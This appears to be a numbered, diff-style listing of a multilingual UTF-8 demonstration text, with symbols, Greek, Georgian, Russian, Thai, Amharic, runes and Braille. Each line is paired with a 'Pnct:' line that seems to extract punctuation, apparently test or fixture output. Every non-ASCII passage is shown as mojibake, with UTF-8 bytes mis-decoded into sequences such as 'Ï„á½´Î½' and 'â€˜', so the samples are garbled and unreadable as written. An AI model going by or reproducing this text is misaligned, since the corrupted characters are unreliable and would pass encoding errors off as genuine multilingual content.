+03398:                                             âŽªâŽ¢âŽœâŽ· câ‚ˆ   âŽŸâŽ¥âŽª
+03399: Pnct:                                                                                                
+03400:   â„• âŠ† â„•â‚€ âŠ‚ â„¤ âŠ‚ â„š âŠ‚ â„ âŠ‚ â„‚,                   âŽ¨âŽ¢âŽœ       âŽŸâŽ¥âŽ¬
+03401: Pnct:                         ,                                                    
+03402:                                             âŽªâŽ¢âŽœ âˆž     âŽŸâŽ¥âŽª
+03403: Pnct:                                                                                                    
+03404:   âŠ¥ < a â‰  b â‰¡ c â‰¤ d â‰ª âŠ¤ â‡’ (âŸ¦AâŸ§ â‡” âŸªBâŸ«),      âŽªâŽ¢âŽœ âŽ²     âŽŸâŽ¥âŽª
+03405: Pnct:       <                       ( âŸ¦ âŸ§     âŸª âŸ« ) ,                        
+03406:                                             âŽªâŽ¢âŽœ âŽ³aâ±-bâ±âŽŸâŽ¥âŽª
+03407: Pnct:                                                                                           -
+03408:   2Hâ‚‚ + Oâ‚‚ â‡Œ 2Hâ‚‚O, R = 4.7 kÎ©, âŒ€ 200 mm     âŽ©âŽ£âŽi=1    âŽ âŽ¦âŽ­
+03409: Pnct:       +       ,     =   .   ,                 =        
+03410: Linguistics and dictionaries:
+03411: Pnct:     :
+03412:   Ã°i Ä±ntÉ™ËˆnÃ¦ÊƒÉ™nÉ™l fÉ™ËˆnÉ›tÄ±k É™soÊŠsiËˆeÄ±Êƒn
+03413: Pnct:          
+03414:   Y [ËˆÊpsilÉ”n], Yen [jÉ›n], Yoga [ËˆjoËgÉ‘]
+03415: Pnct:       [ ] ,     [ ] ,     [ ]
+03416: APL:
+03417: Pnct: :
+03418:   ((Vâ³V)=â³â´V)/Vâ†,V		âŒ·â†â³â†’â´âˆ†âˆ‡âŠƒâ€¾âŽâ•âŒˆ
+03419: Pnct:     ( ( ) = ) / , 	 	 â€¾
+03420: Nicer typography in plain text files:
+03421: Pnct:           :
+03422:   â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
+03423: Pnct:    
+03424:   â•‘                                          â•‘
+03425: Pnct:                                                                                        
+03426:   â•‘   â€¢ â€˜singleâ€™ and â€œdoubleâ€ quotes         â•‘
+03427: Pnct:           â€¢   â€˜ â€™     â€œ â€                    
+03428:   â•‘                                          â•‘
+03429: Pnct:                                                                                        
+03430:   â•‘   â€¢ Curly apostrophes: â€œWeâ€™ve been hereâ€ â•‘
+03431: Pnct:           â€¢     :   â€œ â€™     â€  
+03432:   â•‘                                          â•‘
+03433: Pnct:                                                                                        
+03434:   â•‘   â€¢ Latin-1 apostrophe and accents: 'Â´`  â•‘
+03435: Pnct:           â€¢   -       :   ' Â´ `    
+03436:   â•‘                                          â•‘
+03437: Pnct:                                                                                        
+03438:   â•‘   â€¢ â€šdeutscheâ€˜ â€žAnfÃ¼hrungszeichenâ€œ       â•‘
+03439: Pnct:           â€¢   â€š â€˜   â€ž â€œ              
+03440:   â•‘                                          â•‘
+03441: Pnct:                                                                                        
+03442:   â•‘   â€¢ â€ , â€¡, â€°, â€¢, 3â€“4, â€”, âˆ’5/+5, â„¢, â€¦      â•‘
+03443: Pnct:           â€¢   â€  ,   â€¡ ,   â€° ,   â€¢ ,   â€“ ,   â€” ,   / + ,   ,   â€¦            
+03444:   â•‘                                          â•‘
+03445: Pnct:                                                                                        
+03446:   â•‘   â€¢ ASCII safety test: 1lI|, 0OD, 8B     â•‘
+03447: Pnct:           â€¢       :   | ,   ,            
+03448:   â•‘                      â•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®         â•‘
+03449: Pnct:                                                                  
+03450:   â•‘   â€¢ the euro symbol: â”‚ 14.95 â‚¬ â”‚         â•‘
+03451: Pnct:           â€¢       :     .                      
+03452:   â•‘                      â•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯         â•‘
+03453: Pnct:                                                                  
+03454:   â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+03455: Pnct:    
+03456: Combining characters:
+03457: Pnct:   :
+03458:   STARGÎ›ÌŠTE SG-1, a = vÌ‡ = rÌˆ, aâƒ‘ âŠ¥ bâƒ‘
+03459: Pnct:       - ,     =     =   ,      
+03460: Greek (in Polytonic):
+03461: Pnct:   (   ) :
+03462:   The Greek anthem:
+03463: Pnct:         :
+03464:   Î£á½² Î³Î½Ï‰Ïá½·Î¶Ï‰ á¼€Ï€á½¸ Ï„á½´Î½ Îºá½¹ÏˆÎ·
+03465: Pnct:            
+03466:   Ï„Î¿á¿¦ ÏƒÏ€Î±Î¸Î¹Î¿á¿¦ Ï„á½´Î½ Ï„ÏÎ¿Î¼ÎµÏá½µ,
+03467: Pnct:           ,
+03468:   Ïƒá½² Î³Î½Ï‰Ïá½·Î¶Ï‰ á¼€Ï€á½¸ Ï„á½´Î½ á½„ÏˆÎ·
+03469: Pnct:            
+03470:   Ï€Î¿á½º Î¼á½² Î²á½·Î± Î¼ÎµÏ„Ïá½±ÎµÎ¹ Ï„á½´ Î³á¿†.
+03471: Pnct:               .
+03472:   á¾¿Î‘Ï€á¾¿ Ï„á½° Îºá½¹ÎºÎºÎ±Î»Î± Î²Î³Î±Î»Î¼á½³Î½Î·
+03473: Pnct:          
+03474:   Ï„á¿¶Î½ á¿¾Î•Î»Î»á½µÎ½Ï‰Î½ Ï„á½° á¼±ÎµÏá½±
+03475: Pnct:          
+03476:   ÎºÎ±á½¶ Ïƒá½°Î½ Ï€Ïá¿¶Ï„Î± á¼€Î½Î´ÏÎµÎ¹Ï‰Î¼á½³Î½Î·
+03477: Pnct:          
+03478:   Ï‡Î±á¿–ÏÎµ, á½¦ Ï‡Î±á¿–ÏÎµ, á¾¿Î•Î»ÎµÏ…Î¸ÎµÏÎ¹á½±!
+03479: Pnct:     ,     ,   !
+03480:   From a speech of Demosthenes in the 4th century BC:
+03481: Pnct:                       :
+03482:   ÎŸá½Ï‡á½¶ Ï„Î±á½Ï„á½° Ï€Î±Ïá½·ÏƒÏ„Î±Ï„Î±á½· Î¼Î¿Î¹ Î³Î¹Î³Î½á½½ÏƒÎºÎµÎ¹Î½, á½¦ á¼„Î½Î´ÏÎµÏ‚ á¾¿Î‘Î¸Î·Î½Î±á¿–Î¿Î¹,
+03483: Pnct:             ,       ,
+03484:   á½…Ï„Î±Î½ Ï„á¾¿ Îµá¼°Ï‚ Ï„á½° Ï€Ïá½±Î³Î¼Î±Ï„Î± á¼€Ï€Î¿Î²Î»á½³ÏˆÏ‰ ÎºÎ±á½¶ á½…Ï„Î±Î½ Ï€Ïá½¸Ï‚ Ï„Î¿á½ºÏ‚
+03485: Pnct:                      
+03486:   Î»á½¹Î³Î¿Ï…Ï‚ Î¿á½“Ï‚ á¼€ÎºÎ¿á½»Ï‰Î‡ Ï„Î¿á½ºÏ‚ Î¼á½²Î½ Î³á½°Ï Î»á½¹Î³Î¿Ï…Ï‚ Ï€ÎµÏá½¶ Ï„Î¿á¿¦
+03487: Pnct:         Î‡            
+03488:   Ï„Î¹Î¼Ï‰Ïá½µÏƒÎ±ÏƒÎ¸Î±Î¹ Î¦á½·Î»Î¹Ï€Ï€Î¿Î½ á½Ïá¿¶ Î³Î¹Î³Î½Î¿Î¼á½³Î½Î¿Ï…Ï‚, Ï„á½° Î´á½² Ï€Ïá½±Î³Î¼Î±Ï„á¾¿
+03489: Pnct:           ,      
+03490:   Îµá¼°Ï‚ Ï„Î¿á¿¦Ï„Î¿ Ï€ÏÎ¿á½µÎºÎ¿Î½Ï„Î±,  á½¥ÏƒÎ¸á¾¿ á½…Ï€Ï‰Ï‚ Î¼á½´ Ï€ÎµÎ¹Ïƒá½¹Î¼ÎµÎ¸á¾¿ Î±á½Ï„Î¿á½¶
+03491: Pnct:         ,            
+03492:   Ï€Ïá½¹Ï„ÎµÏÎ¿Î½ ÎºÎ±Îºá¿¶Ï‚ ÏƒÎºá½³ÏˆÎ±ÏƒÎ¸Î±Î¹ Î´á½³Î¿Î½. Î¿á½Î´á½³Î½ Î¿á½–Î½ á¼„Î»Î»Î¿ Î¼Î¿Î¹ Î´Î¿ÎºÎ¿á¿¦ÏƒÎ¹Î½
+03493: Pnct:           .          
+03494:   Î¿á¼± Ï„á½° Ï„Î¿Î¹Î±á¿¦Ï„Î± Î»á½³Î³Î¿Î½Ï„ÎµÏ‚ á¼¢ Ï„á½´Î½ á½‘Ï€á½¹Î¸ÎµÏƒÎ¹Î½, Ï€ÎµÏá½¶ á¼§Ï‚ Î²Î¿Ï…Î»Îµá½»ÎµÏƒÎ¸Î±Î¹,
+03495: Pnct:                 ,       ,
+03496:   Î¿á½Ï‡á½¶ Ï„á½´Î½ Î¿á½–ÏƒÎ±Î½ Ï€Î±ÏÎ¹ÏƒÏ„á½±Î½Ï„ÎµÏ‚ á½‘Î¼á¿–Î½ á¼Î¼Î±ÏÏ„á½±Î½ÎµÎ¹Î½. á¼Î³á½¼ Î´á½³, á½…Ï„Î¹ Î¼á½³Î½
+03497: Pnct:               .     ,    
+03498:   Ï€Î¿Ï„á¾¿ á¼Î¾á¿†Î½ Ï„á¿‡ Ï€á½¹Î»ÎµÎ¹ ÎºÎ±á½¶ Ï„á½° Î±á½‘Ï„á¿†Ï‚ á¼”Ï‡ÎµÎ¹Î½ á¼€ÏƒÏ†Î±Î»á¿¶Ï‚ ÎºÎ±á½¶ Î¦á½·Î»Î¹Ï€Ï€Î¿Î½
+03499: Pnct:                        
+03500:   Ï„Î¹Î¼Ï‰Ïá½µÏƒÎ±ÏƒÎ¸Î±Î¹, ÎºÎ±á½¶ Î¼á½±Î»á¾¿ á¼€ÎºÏÎ¹Î²á¿¶Ï‚ Î¿á¼¶Î´Î±Î‡ á¼Ï€á¾¿ á¼Î¼Î¿á¿¦ Î³á½±Ï, Î¿á½ Ï€á½±Î»Î±Î¹
+03501: Pnct:     ,         Î‡       ,    
+03502:   Î³á½³Î³Î¿Î½ÎµÎ½ Ï„Î±á¿¦Ï„á¾¿ á¼€Î¼Ï†á½¹Ï„ÎµÏÎ±Î‡ Î½á¿¦Î½ Î¼á½³Î½Ï„Î¿Î¹ Ï€á½³Ï€ÎµÎ¹ÏƒÎ¼Î±Î¹ Ï„Î¿á¿¦Î¸á¾¿ á¼±ÎºÎ±Î½á½¸Î½
+03503: Pnct:         Î‡          
+03504:   Ï€ÏÎ¿Î»Î±Î²Îµá¿–Î½ á¼¡Î¼á¿–Î½ Îµá¼¶Î½Î±Î¹ Ï„á½´Î½ Ï€Ïá½½Ï„Î·Î½, á½…Ï€Ï‰Ï‚ Ï„Î¿á½ºÏ‚ ÏƒÏ…Î¼Î¼á½±Ï‡Î¿Ï…Ï‚
+03505: Pnct:             ,      
+03506:   Ïƒá½½ÏƒÎ¿Î¼ÎµÎ½. á¼á½°Î½ Î³á½°Ï Ï„Î¿á¿¦Ï„Î¿ Î²ÎµÎ²Î±á½·Ï‰Ï‚ á½‘Ï€á½±ÏÎ¾á¿ƒ, Ï„á½¹Ï„Îµ ÎºÎ±á½¶ Ï€ÎµÏá½¶ Ï„Î¿á¿¦
+03507: Pnct:     .           ,        
+03508:   Ï„á½·Î½Î± Ï„Î¹Î¼Ï‰Ïá½µÏƒÎµÏ„Î±á½· Ï„Î¹Ï‚ ÎºÎ±á½¶ á½ƒÎ½ Ï„Ïá½¹Ï€Î¿Î½ á¼Î¾á½³ÏƒÏ„Î±Î¹ ÏƒÎºÎ¿Ï€Îµá¿–Î½Î‡ Ï€Ïá½¶Î½ Î´á½²
+03509: Pnct:                   Î‡    
+03510:   Ï„á½´Î½ á¼€ÏÏ‡á½´Î½ á½€ÏÎ¸á¿¶Ï‚ á½‘Ï€Î¿Î¸á½³ÏƒÎ¸Î±Î¹, Î¼á½±Ï„Î±Î¹Î¿Î½ á¼¡Î³Î¿á¿¦Î¼Î±Î¹ Ï€ÎµÏá½¶ Ï„á¿†Ï‚
+03511: Pnct:           ,        
+03512:   Ï„ÎµÎ»ÎµÏ…Ï„á¿†Ï‚ á½Î½Ï„Î¹Î½Î¿á¿¦Î½ Ï€Î¿Î¹Îµá¿–ÏƒÎ¸Î±Î¹ Î»á½¹Î³Î¿Î½.
+03513: Pnct:           .
+03514:   Î”Î·Î¼Î¿ÏƒÎ¸á½³Î½Î¿Ï…Ï‚, Î“á¿½ á¾¿ÎŸÎ»Ï…Î½Î¸Î¹Î±Îºá½¸Ï‚
+03515: Pnct:     ,    
+03516: Georgian:
+03517: Pnct: :
+03518:   From a Unicode conference invitation:
+03519: Pnct:             :
+03520:   áƒ’áƒ—áƒ®áƒáƒ•áƒ— áƒáƒ®áƒšáƒáƒ•áƒ” áƒ’áƒáƒ˜áƒáƒ áƒáƒ— áƒ áƒ”áƒ’áƒ˜áƒ¡áƒ¢áƒ áƒáƒªáƒ˜áƒ Unicode-áƒ˜áƒ¡ áƒ›áƒ”áƒáƒ—áƒ” áƒ¡áƒáƒ”áƒ áƒ—áƒáƒ¨áƒáƒ áƒ˜áƒ¡áƒ
+03521: Pnct:             -    
+03522:   áƒ™áƒáƒœáƒ¤áƒ”áƒ áƒ”áƒœáƒªáƒ˜áƒáƒ–áƒ” áƒ“áƒáƒ¡áƒáƒ¡áƒ¬áƒ áƒ”áƒ‘áƒáƒ“, áƒ áƒáƒ›áƒ”áƒšáƒ˜áƒª áƒ’áƒáƒ˜áƒ›áƒáƒ áƒ—áƒ”áƒ‘áƒ 10-12 áƒ›áƒáƒ áƒ¢áƒ¡,
+03523: Pnct:       ,       -   ,
+03524:   áƒ¥. áƒ›áƒáƒ˜áƒœáƒªáƒ¨áƒ˜, áƒ’áƒ”áƒ áƒ›áƒáƒœáƒ˜áƒáƒ¨áƒ˜. áƒ™áƒáƒœáƒ¤áƒ”áƒ áƒ”áƒœáƒªáƒ˜áƒ áƒ¨áƒ”áƒ°áƒ™áƒ áƒ”áƒ‘áƒ¡ áƒ”áƒ áƒ—áƒáƒ“ áƒ›áƒ¡áƒáƒ¤áƒšáƒ˜áƒáƒ¡
+03525: Pnct:     .   ,   .        
+03526:   áƒ”áƒ¥áƒ¡áƒžáƒ”áƒ áƒ¢áƒ”áƒ‘áƒ¡ áƒ˜áƒ¡áƒ”áƒ— áƒ“áƒáƒ áƒ’áƒ”áƒ‘áƒ¨áƒ˜ áƒ áƒáƒ’áƒáƒ áƒ˜áƒªáƒáƒ áƒ˜áƒœáƒ¢áƒ”áƒ áƒœáƒ”áƒ¢áƒ˜ áƒ“áƒ Unicode-áƒ˜,
+03527: Pnct:                 - ,
+03528:   áƒ˜áƒœáƒ¢áƒ”áƒ áƒœáƒáƒªáƒ˜áƒáƒœáƒáƒšáƒ˜áƒ–áƒáƒªáƒ˜áƒ áƒ“áƒ áƒšáƒáƒ™áƒáƒšáƒ˜áƒ–áƒáƒªáƒ˜áƒ, Unicode-áƒ˜áƒ¡ áƒ’áƒáƒ›áƒáƒ§áƒ”áƒœáƒ”áƒ‘áƒ
+03529: Pnct:         ,   -  
+03530:   áƒáƒžáƒ”áƒ áƒáƒªáƒ˜áƒ£áƒš áƒ¡áƒ˜áƒ¡áƒ¢áƒ”áƒ›áƒ”áƒ‘áƒ¡áƒ, áƒ“áƒ áƒ’áƒáƒ›áƒáƒ§áƒ”áƒœáƒ”áƒ‘áƒ˜áƒ— áƒžáƒ áƒáƒ’áƒ áƒáƒ›áƒ”áƒ‘áƒ¨áƒ˜, áƒ¨áƒ áƒ˜áƒ¤áƒ¢áƒ”áƒ‘áƒ¨áƒ˜,
+03531: Pnct:       ,       ,   ,
+03532:   áƒ¢áƒ”áƒ¥áƒ¡áƒ¢áƒ”áƒ‘áƒ˜áƒ¡ áƒ“áƒáƒ›áƒ£áƒ¨áƒáƒ•áƒ”áƒ‘áƒáƒ¡áƒ áƒ“áƒ áƒ›áƒ áƒáƒ•áƒáƒšáƒ”áƒœáƒáƒ•áƒáƒœ áƒ™áƒáƒ›áƒžáƒ˜áƒ£áƒ¢áƒ”áƒ áƒ£áƒš áƒ¡áƒ˜áƒ¡áƒ¢áƒ”áƒ›áƒ”áƒ‘áƒ¨áƒ˜.
+03533: Pnct:               .
+03534: Russian:
+03535: Pnct: :
+03536:   From a Unicode conference invitation:
+03537: Pnct:             :
+03538:   Ð—Ð°Ñ€ÐµÐ³Ð¸ÑÑ‚Ñ€Ð¸Ñ€ÑƒÐ¹Ñ‚ÐµÑÑŒ ÑÐµÐ¹Ñ‡Ð°Ñ Ð½Ð° Ð”ÐµÑÑÑ‚ÑƒÑŽ ÐœÐµÐ¶Ð´ÑƒÐ½Ð°Ñ€Ð¾Ð´Ð½ÑƒÑŽ ÐšÐ¾Ð½Ñ„ÐµÑ€ÐµÐ½Ñ†Ð¸ÑŽ Ð¿Ð¾
+03539: Pnct:                
+03540:   Unicode, ÐºÐ¾Ñ‚Ð¾Ñ€Ð°Ñ ÑÐ¾ÑÑ‚Ð¾Ð¸Ñ‚ÑÑ 10-12 Ð¼Ð°Ñ€Ñ‚Ð° 1997 Ð³Ð¾Ð´Ð° Ð² ÐœÐ°Ð¹Ð½Ñ†Ðµ Ð² Ð“ÐµÑ€Ð¼Ð°Ð½Ð¸Ð¸.
+03541: Pnct:     ,       -               .
+03542:   ÐšÐ¾Ð½Ñ„ÐµÑ€ÐµÐ½Ñ†Ð¸Ñ ÑÐ¾Ð±ÐµÑ€ÐµÑ‚ ÑˆÐ¸Ñ€Ð¾ÐºÐ¸Ð¹ ÐºÑ€ÑƒÐ³ ÑÐºÑÐ¿ÐµÑ€Ñ‚Ð¾Ð² Ð¿Ð¾  Ð²Ð¾Ð¿Ñ€Ð¾ÑÐ°Ð¼ Ð³Ð»Ð¾Ð±Ð°Ð»ÑŒÐ½Ð¾Ð³Ð¾
+03543: Pnct:                    
+03544:   Ð˜Ð½Ñ‚ÐµÑ€Ð½ÐµÑ‚Ð° Ð¸ Unicode, Ð»Ð¾ÐºÐ°Ð»Ð¸Ð·Ð°Ñ†Ð¸Ð¸ Ð¸ Ð¸Ð½Ñ‚ÐµÑ€Ð½Ð°Ñ†Ð¸Ð¾Ð½Ð°Ð»Ð¸Ð·Ð°Ñ†Ð¸Ð¸, Ð²Ð¾Ð¿Ð»Ð¾Ñ‰ÐµÐ½Ð¸ÑŽ Ð¸
+03545: Pnct:         ,       ,    
+03546:   Ð¿Ñ€Ð¸Ð¼ÐµÐ½ÐµÐ½Ð¸ÑŽ Unicode Ð² Ñ€Ð°Ð·Ð»Ð¸Ñ‡Ð½Ñ‹Ñ… Ð¾Ð¿ÐµÑ€Ð°Ñ†Ð¸Ð¾Ð½Ð½Ñ‹Ñ… ÑÐ¸ÑÑ‚ÐµÐ¼Ð°Ñ… Ð¸ Ð¿Ñ€Ð¾Ð³Ñ€Ð°Ð¼Ð¼Ð½Ñ‹Ñ…
+03547: Pnct:                  
+03548:   Ð¿Ñ€Ð¸Ð»Ð¾Ð¶ÐµÐ½Ð¸ÑÑ…, ÑˆÑ€Ð¸Ñ„Ñ‚Ð°Ñ…, Ð²ÐµÑ€ÑÑ‚ÐºÐµ Ð¸ Ð¼Ð½Ð¾Ð³Ð¾ÑÐ·Ñ‹Ñ‡Ð½Ñ‹Ñ… ÐºÐ¾Ð¼Ð¿ÑŒÑŽÑ‚ÐµÑ€Ð½Ñ‹Ñ… ÑÐ¸ÑÑ‚ÐµÐ¼Ð°Ñ….
+03549: Pnct:     ,   ,           .
+03550: Thai (UCS Level 2):
+03551: Pnct:   (     ) :
+03552:   Excerpt from a poetry on The Romance of The Three Kingdoms (a Chinese
+03553: Pnct:                           (  
+03554:   classic 'San Gua'):
+03555: Pnct:       '   ' ) :
+03556:   [----------------------------|------------------------]
+03557: Pnct:     [ - - - - - - - - - - - - - - - - - - - - - - - - - - - - | - - - - - - - - - - - - - - - - - - - - - - - - ]
+03558:     à¹ à¹à¸œà¹ˆà¸™à¸”à¸´à¸™à¸®à¸±à¹ˆà¸™à¹€à¸ªà¸·à¹ˆà¸­à¸¡à¹‚à¸—à¸£à¸¡à¹à¸ªà¸™à¸ªà¸±à¸‡à¹€à¸§à¸Š  à¸žà¸£à¸°à¸›à¸à¹€à¸à¸¨à¸à¸­à¸‡à¸šà¸¹à¹Šà¸à¸¹à¹‰à¸‚à¸¶à¹‰à¸™à¹ƒà¸«à¸¡à¹ˆ
+03559: Pnct:           à¸´    
+03560:   à¸ªà¸´à¸šà¸ªà¸­à¸‡à¸à¸©à¸±à¸•à¸£à¸´à¸¢à¹Œà¸à¹ˆà¸­à¸™à¸«à¸™à¹‰à¸²à¹à¸¥à¸–à¸±à¸”à¹„à¸›       à¸ªà¸­à¸‡à¸­à¸‡à¸„à¹Œà¹„à¸‹à¸£à¹‰à¹‚à¸‡à¹ˆà¹€à¸‚à¸¥à¸²à¹€à¸šà¸²à¸›à¸±à¸à¸à¸²
+03561: Pnct:     à¸´ à¸´              
+03562:     à¸—à¸£à¸‡à¸™à¸±à¸šà¸–à¸·à¸­à¸‚à¸±à¸™à¸—à¸µà¹€à¸›à¹‡à¸™à¸—à¸µà¹ˆà¸žà¸¶à¹ˆà¸‡           à¸šà¹‰à¸²à¸™à¹€à¸¡à¸·à¸­à¸‡à¸ˆà¸¶à¸‡à¸§à¸´à¸›à¸£à¸´à¸•à¹€à¸›à¹‡à¸™à¸™à¸±à¸à¸«à¸™à¸²
+03563: Pnct:                               à¸´ à¸´
+03564:   à¹‚à¸®à¸ˆà¸´à¹‹à¸™à¹€à¸£à¸µà¸¢à¸à¸—à¸±à¸žà¸—à¸±à¹ˆà¸§à¸«à¸±à¸§à¹€à¸¡à¸·à¸­à¸‡à¸¡à¸²         à¸«à¸¡à¸²à¸¢à¸ˆà¸°à¸†à¹ˆà¸²à¸¡à¸”à¸Šà¸±à¹ˆà¸§à¸•à¸±à¸§à¸ªà¸³à¸„à¸±à¸
+03565: Pnct:     à¸´                  
+03566:     à¹€à¸«à¸¡à¸·à¸­à¸™à¸‚à¸±à¸šà¹„à¸ªà¹„à¸¥à¹ˆà¹€à¸ªà¸·à¸­à¸ˆà¸²à¸à¹€à¸„à¸«à¸²      à¸£à¸±à¸šà¸«à¸¡à¸²à¸›à¹ˆà¸²à¹€à¸‚à¹‰à¸²à¸¡à¸²à¹€à¸¥à¸¢à¸­à¸²à¸ªà¸±à¸
+03567: Pnct:                    
+03568:   à¸à¹ˆà¸²à¸¢à¸­à¹‰à¸­à¸‡à¸­à¸¸à¹‰à¸™à¸¢à¸¸à¹à¸¢à¸à¹ƒà¸«à¹‰à¹à¸•à¸à¸à¸±à¸™          à¹ƒà¸Šà¹‰à¸ªà¸²à¸§à¸™à¸±à¹‰à¸™à¹€à¸›à¹‡à¸™à¸Šà¸™à¸§à¸™à¸Šà¸·à¹ˆà¸™à¸Šà¸§à¸™à¹ƒà¸ˆ
+03569: Pnct:                        
+03570:     à¸žà¸¥à¸±à¸™à¸¥à¸´à¸‰à¸¸à¸¢à¸à¸¸à¸¢à¸à¸µà¸à¸¥à¸±à¸šà¸à¹ˆà¸­à¹€à¸«à¸•à¸¸          à¸Šà¹ˆà¸²à¸‡à¸­à¸²à¹€à¸žà¸¨à¸ˆà¸£à¸´à¸‡à¸«à¸™à¸²à¸Ÿà¹‰à¸²à¸£à¹‰à¸­à¸‡à¹„à¸«à¹‰
+03571: Pnct:         à¸´                     à¸´
+03572:   à¸•à¹‰à¸­à¸‡à¸£à¸šà¸£à¸²à¸†à¹ˆà¸²à¸Ÿà¸±à¸™à¸ˆà¸™à¸šà¸£à¸£à¸¥à¸±à¸¢           à¸¤à¹…à¸«à¸²à¹ƒà¸„à¸£à¸„à¹‰à¸³à¸Šà¸¹à¸à¸¹à¹‰à¸šà¸£à¸£à¸¥à¸±à¸‡à¸à¹Œ à¸¯
+03573: Pnct:                            
+03574:   (The above is a two-column text. If combining characters are handled
+03575: Pnct:     (         -   .          
+03576:   correctly, the lines of the second column should be aligned with the
+03577: Pnct:     ,                      
+03578:   | character above.)
+03579: Pnct:     |     . )
+03580: Ethiopian:
+03581: Pnct: :
+03582:   Proverbs in the Amharic language:
+03583: Pnct:             :
+03584:   áˆ°áˆ›á‹­ áŠ á‹­á‰³áˆ¨áˆµ áŠ•áŒ‰áˆ¥ áŠ á‹­áŠ¨áˆ°áˆµá¢
+03585: Pnct:           á¢
+03586:   á‰¥áˆ‹ áŠ«áˆˆáŠ áŠ¥áŠ•á‹°áŠ á‰£á‰´ á‰ á‰†áˆ˜áŒ áŠá¢
+03587: Pnct:           á¢
+03588:   áŒŒáŒ¥ á‹«áˆˆá‰¤á‰± á‰áˆáŒ¥áŠ“ áŠá‹á¢
+03589: Pnct:           á¢
+03590:   á‹°áˆ€ á‰ áˆ•áˆáˆ™ á‰…á‰¤ á‰£á‹­áŒ áŒ£ áŠ•áŒ£á‰µ á‰ áŒˆá‹°áˆˆá‹á¢
+03591: Pnct:               á¢
+03592:   á‹¨áŠ á á‹ˆáˆˆáˆá‰³ á‰ á‰…á‰¤ áŠ á‹­á‰³áˆ½áˆá¢
+03593: Pnct:           á¢
+03594:   áŠ á‹­áŒ¥ á‰ á‰ áˆ‹ á‹³á‹‹ á‰°áˆ˜á‰³á¢
+03595: Pnct:           á¢
+03596:   áˆ²á‰°áˆ¨áŒ‰áˆ™ á‹­á‹°áˆ¨áŒáˆ™á¢
+03597: Pnct:       á¢
+03598:   á‰€áˆµ á‰ á‰€áˆµá¥ á‹•áŠ•á‰áˆ‹áˆ á‰ áŠ¥áŒáˆ© á‹­áˆ„á‹³áˆá¢
+03599: Pnct:       á¥       á¢
+03600:   á‹µáˆ­ á‰¢á‹«á‰¥áˆ­ áŠ áŠ•á‰ áˆ³ á‹«áˆµáˆ­á¢
+03601: Pnct:           á¢
+03602:   áˆ°á‹ áŠ¥áŠ•á‹°á‰¤á‰± áŠ¥áŠ•áŒ… áŠ¥áŠ•á‹° áŒ‰áˆ¨á‰¤á‰± áŠ á‹­á‰°á‹³á‹°áˆ­áˆá¢
+03603: Pnct:               á¢
+03604:   áŠ¥áŒá‹œáˆ­ á‹¨áŠ¨áˆá‰°á‹áŠ• áŒ‰áˆ®áˆ® áˆ³á‹­á‹˜áŒ‹á‹ áŠ á‹­á‹µáˆ­áˆá¢
+03605: Pnct:             á¢
+03606:   á‹¨áŒŽáˆ¨á‰¤á‰µ áˆŒá‰£á¥ á‰¢á‹«á‹©á‰µ á‹­áˆµá‰… á‰£á‹«á‹©á‰µ á‹«áŒ áˆá‰…á¢
+03607: Pnct:       á¥         á¢
+03608:   áˆ¥áˆ« áŠ¨áˆ˜áá‰³á‰µ áˆáŒ„áŠ• áˆ‹á‹á‰³á‰µá¢
+03609: Pnct:           á¢
+03610:   á‹“á‰£á‹­ áˆ›á‹°áˆªá‹« á‹¨áˆˆá‹á¥ áŒáŠ•á‹µ á‹­á‹ž á‹­á‹žáˆ«áˆá¢
+03611: Pnct:         á¥       á¢
+03612:   á‹¨áŠ¥áˆµáˆ‹áˆ áŠ áŒˆáˆ© áˆ˜áŠ« á‹¨áŠ áˆžáˆ« áŠ áŒˆáˆ© á‹‹áˆ­áŠ«á¢
+03613: Pnct:               á¢
+03614:   á‰°áŠ•áŒ‹áˆŽ á‰¢á‰°á‰ á‰°áˆ˜áˆáˆ¶ á‰£á‰á¢
+03615: Pnct:           á¢
+03616:   á‹ˆá‹³áŒ…áˆ… áˆ›áˆ­ á‰¢áˆ†áŠ• áŒ¨áˆ­áˆµáˆ… áŠ á‰µáˆ‹áˆ°á‹á¢
+03617: Pnct:             á¢
+03618:   áŠ¥áŒáˆ­áˆ…áŠ• á‰ ááˆ«áˆ½áˆ… áˆáŠ­ á‹˜áˆ­áŒ‹á¢
+03619: Pnct:           á¢
+03620: Runes:
+03621: Pnct: :
+03622:   áš»á›– áš³áš¹áš«áš¦ áš¦áš«á› áš»á›– á›’áš¢á›žá›– áš©áš¾ áš¦áš«á›— á›šášªáš¾á›žá›– áš¾áš©áš±áš¦áš¹á›–ášªáš±á›žáš¢á›— áš¹á›áš¦ áš¦ášª áš¹á›–á›¥áš«
+03623: Pnct:                          
+03624:   (Old English, which transcribed into Latin reads 'He cwaeth that he
+03625: Pnct:     (   ,             '      
+03626:   bude thaem lande northweardum with tha Westsae.' and means 'He said
+03627: Pnct:                 . '       '  
+03628:   that he lived in the northern land near the Western Sea.')
+03629: Pnct:                         . ' )
+03630: Braille:
+03631: Pnct: :
+03632:   â¡Œâ â §â ‘ â ¼â â ’  â¡â œâ ‡â ‘â ¹â °â Ž â¡£â •â Œ
+03633: Pnct:            
+03634:   â¡â œâ ‡â ‘â ¹ â ºâ â Ž â ™â ‘â â ™â ’ â žâ • â ƒâ ‘â ›â ” â ºâ Šâ ¹â ² â¡¹â »â ‘ â Šâ Ž â â • â ™â ³â ƒâ ž
+03635: Pnct:                      
+03636:   â ±â â žâ ‘â §â » â â ƒâ ³â ž â ¹â â žâ ² â¡¹â ‘ â —â ‘â ›â Šâ Œâ » â •â ‹ â ™â Šâ Ž â ƒâ ¥â —â Šâ â ‡ â ºâ â Ž
+03637: Pnct:                    
+03638:   â Žâ Šâ ›â â « â ƒâ ¹ â ¹â ‘ â Šâ ‡â »â ›â ¹â â â â ‚ â ¹â ‘ â Šâ ‡â »â …â ‚ â ¹â ‘ â ¥â â ™â »â žâ â …â »â ‚
+03639: Pnct:                  
+03640:   â â â ™ â ¹â ‘ â ¡â Šâ ‘â ‹ â â ³â —â â »â ² â¡Žâ Šâ —â •â •â ›â ‘ â Žâ Šâ ›â â « â Šâ žâ ² â¡â â ™
+03641: Pnct:                  
